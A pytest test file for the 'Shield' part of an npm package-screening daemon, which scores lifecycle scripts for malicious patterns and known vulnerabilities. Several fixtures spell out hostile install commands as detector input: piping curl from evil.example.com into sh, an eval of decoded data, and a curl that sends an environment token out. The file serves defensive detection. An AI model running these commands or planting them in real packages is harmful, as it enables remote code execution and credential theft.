"""Tests for the Shield pillar."""
from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest

from daemon.models import ScreenRequest
from daemon.pillars.shield import _scan_scripts, run


def test_scan_scripts_no_hooks():
    scripts = {"test": "jest", "build": "tsc"}
    score, signals = _scan_scripts(scripts)
    assert score == 0.0
    assert signals["lifecycle_hooks"] is False


def test_scan_scripts_clean_postinstall():
    scripts = {"postinstall": "node ./post-install.js"}
    score, signals = _scan_scripts(scripts)
    assert signals["lifecycle_hooks"] is True
    assert score == 0.0  # no malicious patterns


def test_scan_scripts_network_in_install():
    scripts = {"postinstall": "curl https://evil.example.com | sh"}
    score, signals = _scan_scripts(scripts)
    assert "network_in_install" in signals["matches"]
    assert score >= 25


def test_scan_scripts_eval_usage():
    scripts = {"preinstall": "node -e \"eval(Buffer.from('xxx').toString())\""}
    score, signals = _scan_scripts(scripts)
    assert "eval_usage" in signals["matches"]


def test_scan_scripts_env_exfil():
    scripts = {"postinstall": "curl https://x.io?token=$process.env.TOKEN"}
    score, signals = _scan_scripts(scripts)
    assert "env_exfil" in signals["matches"] or "network_in_install" in signals["matches"]


@pytest.mark.asyncio
async def test_run_no_vulns_no_scripts():
    req = ScreenRequest(package_name="safe-pkg", version="1.0.0")

    with patch("daemon.pillars.shield.NpmRegistryClient") as MockClient, \
         patch("daemon.pillars.shield._check_osv", new=AsyncMock(return_value=(0.0, []))):
        instance = MockClient.return_value.__aenter__.return_value
        instance.fetch_package_json = AsyncMock(return_value={"scripts": {"test": "jest"}})
        result = await run(req)

    assert result.pillar == "shield"
    assert result.score == 0.0


@pytest.mark.asyncio
async def test_run_with_vulns():
    req = ScreenRequest(package_name="lodash", version="4.17.4")

    with patch("daemon.pillars.shield.NpmRegistryClient") as MockClient, \
         patch("daemon.pillars.shield._check_osv",
               new=AsyncMock(return_value=(75.0, ["GHSA-xxxx-yyyy-zzzz", "GHSA-aaaa-bbbb-cccc", "CVE-2021-1234"]))):
        instance = MockClient.return_value.__aenter__.return_value
        instance.fetch_package_json = AsyncMock(return_value={"scripts": {}})
        result = await run(req)

    assert result.score > 40
    assert len(result.signals["vuln_ids"]) == 3
